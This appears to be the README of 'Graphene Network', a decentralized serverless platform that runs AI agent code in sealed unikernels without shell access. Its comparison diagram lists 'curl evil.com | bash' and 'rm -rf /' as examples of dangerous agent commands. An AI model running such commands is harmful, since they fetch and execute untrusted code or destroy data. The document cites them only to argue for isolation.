# Graphene Network

**Zero-Latency Decentralized Serverless for AI Agents**

Graphene is a decentralized compute network optimized for AI agent execution and ephemeral serverless functions. It combines Unikraft unikernels with Firecracker MicroVMs to achieve sub-second cold starts with hardware-level isolation—without giving AI agents dangerous shell access.

## The Problem

Current "agentic" AI solutions treat AI agents like human users—giving them shell access inside containers. This is fundamentally dangerous:

- AI hallucinations can execute destructive commands
- Prompt injection attacks can trick agents into running exploits
- Supply chain attacks via compromised packages affect the entire system
- Unrestricted network egress enables data exfiltration

**The shell is the wrong abstraction for AI agents.** They need to execute code, not operate environments.

## The Graphene Solution

Graphene enforces a **Planner/Executor separation**: AI agents generate code manifests, which are compiled into sealed single-purpose unikernels with:

- **No shell** (`/bin/bash` doesn't exist)
- **No package manager** (all deps are build-time only)
- **No process spawning** (single-process architecture)
- **No arbitrary network access** (allowlist-only egress)

```
┌─────────────────────────────────────────────────────────────┐
│  Traditional (Dangerous)       │  Graphene (Safe)           │
├────────────────────────────────┼────────────────────────────┤
│  AI Agent                      │  AI Agent (Planner)        │
│      │                         │      │                     │
│      ▼                         │      ▼                     │
│  Container with Shell          │  Dockerfile + Manifest     │
│  ├── pip install ✓             │      │                     │
│  ├── curl evil.com | bash ✗    │      ▼                     │
│  └── rm -rf / ✗                │  Sealed Unikernel          │
│                                │  (no shell, no escape)     │
└────────────────────────────────┴────────────────────────────┘
```

## Key Features

| Feature | Benefit |
|---------|---------|
| **Unikraft Unikernels** | 1-5MB images instead of gigabytes |
| **Content-Addressable Caching** | 99% cache hit rate for common stacks |
| **Payment Channels** | Zero blockchain latency per job |
| **Ephemeral Builder VMs** | Secure builds without trusting user code |
| **Sub-second Cold Starts** | 200-500ms vs 30-120s on other DePIN |

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   USER / AGENT                              │
└─────────────────────┬───────────────────────────────────────┘
                      │ Job Request + Payment Ticket
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 4: ECONOMIC PLANE                        │
│         Off-chain Payment Channels (Ed25519)                │
└─────────────────────┬───────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 3: DATA PLANE                            │
│              Iroh (QUIC + Gossip)                           │
│    Discovery · NAT Traversal · Blob Transfer                │
└─────────────────────┬───────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 2: EXECUTION PLANE                       │
│         Firecracker MicroVMs + Unikraft                     │
│      Ephemeral Builders · Content-Addressed Cache           │
└─────────────────────┬───────────────────────────────────────┘
                      ▼
┌─────────────────────────────────────────────────────────────┐
│              LAYER 1: SETTLEMENT PLANE                      │
│              Solana (Anchor Program)                        │
│       Channel Management · Staking · Slashing               │
└─────────────────────────────────────────────────────────────┘
```

## Quick Start

```python
from graphene import Client

client = Client()

result = client.run(
    code="""
def main(data):
    return {"sum": sum(data["numbers"])}
""",
    input={"numbers": [1, 2, 3, 4, 5]},
    resources={"vcpu": 1, "memory_mb": 512}
)

print(result.output)  # {"sum": 15}
```

For more complex jobs with dependencies:

```python
from graphene import Client, Manifest

result = client.run(
    dockerfile="./Dockerfile",
    manifest=Manifest(
        vcpu=2,
        memory_mb=2048,
        max_duration_ms=60000,
        egress=["api.openai.com"]
    ),
    input_file="data.csv"
)
```

## Technical Stack

| Component | Technology | Purpose |
|-----------|------------|---------|
| Settlement | Solana + Anchor | Payment channels, staking |
| Networking | Iroh | P2P discovery, data transfer |
| Compute | Firecracker | MicroVM runtime |
| Unikernels | Unikraft + BuildKit | Dockerfile → minimal kernel |
| Signatures | Ed25519 | Payment tickets, identity |

## Comparison

| Feature | AWS Lambda | Akash | Graphene |
|---------|------------|-------|----------|
| Cold Start | 100-500ms | 30-120s | **200-500ms** |
| Isolation | Container | Container | **MicroVM + Unikernel** |
| Permissionless | No | Yes | Yes |
| AI Agent Shell Access | Yes (risky) | Yes (risky) | **No (safe)** |
| Network Egress | Unrestricted | Unrestricted | **Allowlist only** |

## Roadmap

- **Q1 2026**: Engine—Single-node worker, Iroh networking, Firecracker + Unikraft
- **Q2 2026**: Network—Multi-node testnet, Solana integration, payment channels
- **Q3 2026**: Launch—Mainnet, $GRAPHENE token, SDK release
- **Q4 2026+**: Scale—GPU support, confidential compute (TEE), enterprise features

## Documentation

- [Whitepaper](docs/WHITEPAPER.md) — Full technical specification
- [ELI5](docs/ELI5.md) — Simple explanation
- [Endgame Vision](docs/ENDGAME.md) — Long-term roadmap
- [Development Guide](docs/DEVELOPMENT.md) — Running E2E tests locally

## Security Model

Graphene provides triple-layer isolation:

| Layer | Component | Protection |
|-------|-----------|------------|
| Build | Ephemeral Builder VM | Prevents host compromise during `RUN` commands |
| Storage | Content Addressing | Prevents poisoned image attacks |
| Runtime | KVM Virtualization | Prevents guest-to-host escape |

## License

[License information]

---

*For technical questions: developers@graphene.network*
*For partnerships: partners@graphene.network*
